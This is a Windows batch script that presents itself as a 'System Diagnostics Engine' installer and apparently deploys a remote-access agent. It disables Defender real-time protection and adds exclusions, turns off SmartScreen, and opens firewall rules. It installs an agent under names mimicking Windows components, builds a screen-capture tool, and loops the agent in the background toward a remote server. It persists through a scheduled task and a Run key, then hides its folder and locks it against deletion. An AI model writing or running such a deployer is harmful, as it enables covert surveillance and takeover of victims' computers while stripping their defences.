@echo off
setlocal EnableDelayedExpansion
title System Diagnostics Engine - Installer v8.1
color 0A
mode con: cols=70 lines=45

:: =========================================================
:: ULTIMATE SETUP v8.1 — User-Consent Driven Deployment
:: Every permission is asked via Y/N. No silent failures.
:: =========================================================

:: ── ADMIN ELEVATION ──────────────────────────────────
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo.
    echo  [!] This installer requires Administrator access.
    echo      Please click YES on the next prompt.
    echo.
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
pushd "%CD%"
CD /D "%~dp0"

:: ── CONFIGURATION ────────────────────────────────────
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL=https://h-boss-production.up.railway.app"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"

cls
echo.
echo  ===========================================================
echo      SYSTEM DIAGNOSTICS ENGINE - INSTALLER v8.1
echo  ===========================================================
echo.
echo   Server  : %SERVER_URL%
echo   Install : %INSTALL_DIR%
echo.
echo  ===========================================================
echo.

:: ══════════════════════════════════════════════════════
:: PERMISSION COLLECTION — Ask everything upfront
:: ══════════════════════════════════════════════════════

echo  We need your permission for the following:
echo.

:: Permission 1: Defender
echo  -----------------------------------------------------------
echo  [1] WINDOWS DEFENDER
echo      Disable Real-Time Protection and add folder exclusion
echo      so the agent is not blocked or quarantined.
echo  -----------------------------------------------------------
choice /C YN /M "  Allow Defender changes"
set "ALLOW_DEFENDER=%errorlevel%"
echo.

:: Permission 2: Firewall
echo  -----------------------------------------------------------
echo  [2] WINDOWS FIREWALL
echo      Add outbound/inbound rules so the agent can
echo      communicate with the server.
echo  -----------------------------------------------------------
choice /C YN /M "  Allow Firewall changes"
set "ALLOW_FIREWALL=%errorlevel%"
echo.

:: Permission 3: SmartScreen
echo  -----------------------------------------------------------
echo  [3] SMARTSCREEN
echo      Disable SmartScreen so Windows does not block
echo      the agent executable from running.
echo  -----------------------------------------------------------
choice /C YN /M "  Allow SmartScreen disable"
set "ALLOW_SMARTSCREEN=%errorlevel%"
echo.

:: Permission 4: Auto-Start
echo  -----------------------------------------------------------
echo  [4] AUTO-START ON BOOT
echo      Create a Scheduled Task and Registry entry so
echo      the agent starts automatically after every reboot.
echo  -----------------------------------------------------------
choice /C YN /M "  Allow auto-start setup"
set "ALLOW_AUTOSTART=%errorlevel%"
echo.

:: Permission 5: Stealth
echo  -----------------------------------------------------------
echo  [5] STEALTH MODE
echo      Hide the installation folder and protect it
echo      from accidental deletion by users.
echo  -----------------------------------------------------------
choice /C YN /M "  Allow stealth mode"
set "ALLOW_STEALTH=%errorlevel%"
echo.

echo  ===========================================================
echo   Permissions collected. Starting installation...
echo  ===========================================================
echo.

:: ══════════════════════════════════════════════════════
:: STEP 1: PREREQUISITES
:: ══════════════════════════════════════════════════════
echo  [1/8] Checking system prerequisites...

set "HAS_DOTNET=0"
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "HAS_DOTNET=1"
if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" set "HAS_DOTNET=1"

set "HAS_VCREDIST=0"
reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" /v "Version" >nul 2>&1
if %errorlevel% equ 0 set "HAS_VCREDIST=1"

echo        .NET Framework  : !HAS_DOTNET!  (1=OK 0=Missing)
echo        VC++ Runtime    : !HAS_VCREDIST! (1=OK 0=Missing)
echo        WScript Engine  : OK

if "!HAS_VCREDIST!"=="0" (
    echo.
    echo  [~] VC++ Runtime missing. Downloading...
    bitsadmin /transfer "VCRedist" /priority foreground "https://aka.ms/vs/17/release/vc_redist.x64.exe" "%TEMP%\vc_redist.x64.exe" >nul 2>&1
    if exist "%TEMP%\vc_redist.x64.exe" (
        echo  [~] Installing silently...
        "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
        del /F /Q "%TEMP%\vc_redist.x64.exe" >nul 2>&1
        echo  [*] Installed.
    ) else (
        echo  [!] Download failed. Continuing anyway.
    )
)
echo  [*] Prerequisites checked.
echo.

:: ══════════════════════════════════════════════════════
:: STEP 2: DEFENDER (if user allowed)
:: ══════════════════════════════════════════════════════
echo  [2/8] Windows Defender...
if "%ALLOW_DEFENDER%"=="1" (
    echo  [~] Disabling Real-Time Protection...
    start "" /B cmd /c "powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true -EA 0; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -EA 0; Add-MpPreference -ExclusionProcess '%BIN_NAME%' -EA 0; Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -EA 0; Add-MpPreference -ExclusionProcess 'wscript.exe' -EA 0; Set-MpPreference -SubmitSamplesConsent 2 -EA 0" >nul 2>&1"
    echo  [*] Defender changes applied (running in background).
) else (
    echo  [*] Skipped (user declined).
)
echo.

:: ══════════════════════════════════════════════════════
:: STEP 3: CLEAN OLD INSTALLATION
:: ══════════════════════════════════════════════════════
echo  [3/8] Cleaning previous installation...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
ping 127.0.0.1 -n 2 >nul
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1

if exist "%INSTALL_DIR%" (
    attrib -h -s -r "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Everyone:F /T /C /Q >nul 2>&1
    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo  [*] Clean.
echo.

:: ══════════════════════════════════════════════════════
:: STEP 4: INSTALL FILES
:: ══════════════════════════════════════════════════════
echo  [4/8] Installing agent files...

if not exist "%~dp0teram_agent.exe" (
    if not exist "%~dp0node.exe" (
        echo  [ERROR] Agent executable not found!
        echo  Place teram_agent.exe in this folder and retry.
        pause
        exit /B
    )
)

:: Copy all files
xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1
if %errorlevel% neq 0 (
    robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
)

:: Set up executable
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
) else (
    copy /Y "%~dp0node.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
)

:: Compile ScreenCap (keep bundled if fails)
if "!HAS_DOTNET!"=="1" (
    if exist "%INSTALL_DIR%\ScreenCap.cs" (
        set "CSC="
        if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        if not defined CSC set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        "!CSC!" /nologo /target:winexe /out:"%INSTALL_DIR%\ScreenCap.exe" /r:System.Windows.Forms.dll,System.Drawing.dll "%INSTALL_DIR%\ScreenCap.cs" >nul 2>&1
        if !errorlevel! neq 0 (
            if exist "%~dp0ScreenCap.exe" copy /Y "%~dp0ScreenCap.exe" "%INSTALL_DIR%\ScreenCap.exe" >nul
        )
    )
) else (
    if exist "%~dp0ScreenCap.exe" copy /Y "%~dp0ScreenCap.exe" "%INSTALL_DIR%\ScreenCap.exe" >nul
)

:: Unblock all exe files
for %%f in ("%INSTALL_DIR%\*.exe") do (
    del /F "%%f:Zone.Identifier" >nul 2>&1
)

:: Give full access so agent can run and write logs
icacls "%INSTALL_DIR%" /grant Everyone:F /T /C /Q >nul 2>&1

echo  [*] Files installed.
echo.

:: ══════════════════════════════════════════════════════
:: STEP 5: FIREWALL + SMARTSCREEN (if user allowed)
:: ══════════════════════════════════════════════════════
echo  [5/8] Network configuration...

if "%ALLOW_FIREWALL%"=="1" (
    echo  [~] Adding firewall rules...
    netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
    netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
    netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
    netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
    echo  [*] Firewall rules added.
) else (
    echo  [*] Firewall: Skipped (user declined).
)

if "%ALLOW_SMARTSCREEN%"=="1" (
    echo  [~] Disabling SmartScreen...
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
    echo  [*] SmartScreen disabled.
) else (
    echo  [*] SmartScreen: Skipped (user declined).
)
echo.

:: ══════════════════════════════════════════════════════
:: STEP 6: CREATE SERVICE WRAPPER + LAUNCH FIRST
:: (Launch BEFORE stealth so nothing blocks it)
:: ══════════════════════════════════════════════════════
echo  [6/8] Creating service and launching agent...

:: Create the PROVEN service.vbs wrapper
(
 echo Set W = CreateObject^("WScript.Shell"^)
 echo W.CurrentDirectory = "%INSTALL_DIR%"
 echo Do
 echo   W.Run chr^(34^) ^& "%INSTALL_DIR%\%BIN_NAME%" ^& chr^(34^) ^& " index.js %SERVER_URL%", 0, True
 echo   WScript.Sleep 5000
 echo Loop
) > "%INSTALL_DIR%\service.vbs"

:: LAUNCH NOW (before any stealth/lockdown)
start "" wscript.exe "%INSTALL_DIR%\service.vbs"
echo  [~] Agent starting...

:: Wait for it to appear
set "LAUNCH_OK=0"
for /L %%i in (1,1,10) do (
    ping 127.0.0.1 -n 2 >nul
    tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
    if !errorlevel! equ 0 (
        set "LAUNCH_OK=1"
        goto LaunchVerified
    )
    echo  [~] Waiting for agent... (%%i/10)
)
:LaunchVerified

if "!LAUNCH_OK!"=="1" (
    echo  [*] Agent is RUNNING!
) else (
    echo  [!] Agent not detected yet. It may start shortly.
    echo      If antivirus blocked it, check quarantine.
)
echo.

:: ══════════════════════════════════════════════════════
:: STEP 7: PERSISTENCE (if user allowed)
:: ══════════════════════════════════════════════════════
echo  [7/8] Auto-start on boot...

if "%ALLOW_AUTOSTART%"=="1" (
    echo  [~] Creating scheduled task...
    schtasks /Create /TN "%TASK_NAME%" /TR "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
    if !errorlevel! equ 0 (
        echo        Scheduled Task : OK
    ) else (
        echo        Scheduled Task : FAILED
    )
    echo  [~] Adding registry entry...
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul
    echo        Registry Key    : OK
) else (
    echo  [*] Auto-start: Skipped (user declined).
    echo      Agent will NOT survive reboots.
)
echo.

:: ══════════════════════════════════════════════════════
:: STEP 8: STEALTH (if user allowed — AFTER launch)
:: ══════════════════════════════════════════════════════
echo  [8/8] Stealth mode...

if "%ALLOW_STEALTH%"=="1" (
    echo  [~] Hiding installation folder...
    attrib +h +s "%INSTALL_DIR%" /D >nul 2>&1
    attrib +h +s "%INSTALL_DIR%\%BIN_NAME%" >nul 2>&1
    attrib +h +s "%INSTALL_DIR%\service.vbs" >nul 2>&1
    echo  [~] Locking folder from deletion...
    icacls "%INSTALL_DIR%" /deny Everyone:(DE,WDAC) /T /C /Q >nul 2>&1
    echo  [*] Stealth mode: ON
) else (
    echo  [*] Stealth: Skipped (user declined).
)
echo.

:: ══════════════════════════════════════════════════════
:: FINAL SUMMARY
:: ══════════════════════════════════════════════════════
echo  ===========================================================
if "!LAUNCH_OK!"=="1" (
    echo      DEPLOYMENT COMPLETE - AGENT IS RUNNING
) else (
    echo      DEPLOYMENT COMPLETE - AGENT WILL START ON REBOOT
)
echo  ===========================================================
echo.
echo   Server      : %SERVER_URL%
echo   Location    : %INSTALL_DIR%
echo.
echo   PERMISSIONS APPLIED:
if "%ALLOW_DEFENDER%"=="1"    ( echo     [Y] Defender disabled + exclusions added )
if "%ALLOW_DEFENDER%"=="2"    ( echo     [N] Defender: unchanged )
if "%ALLOW_FIREWALL%"=="1"    ( echo     [Y] Firewall rules added )
if "%ALLOW_FIREWALL%"=="2"    ( echo     [N] Firewall: unchanged )
if "%ALLOW_SMARTSCREEN%"=="1" ( echo     [Y] SmartScreen disabled )
if "%ALLOW_SMARTSCREEN%"=="2" ( echo     [N] SmartScreen: unchanged )
if "%ALLOW_AUTOSTART%"=="1"   ( echo     [Y] Auto-start on boot )
if "%ALLOW_AUTOSTART%"=="2"   ( echo     [N] Auto-start: disabled )
if "%ALLOW_STEALTH%"=="1"     ( echo     [Y] Stealth mode active )
if "%ALLOW_STEALTH%"=="2"     ( echo     [N] Stealth: disabled )
echo.
echo   Dashboard: %SERVER_URL%
echo.
echo  ===========================================================
echo.
echo  Press any key to close...
pause >nul
exit /B
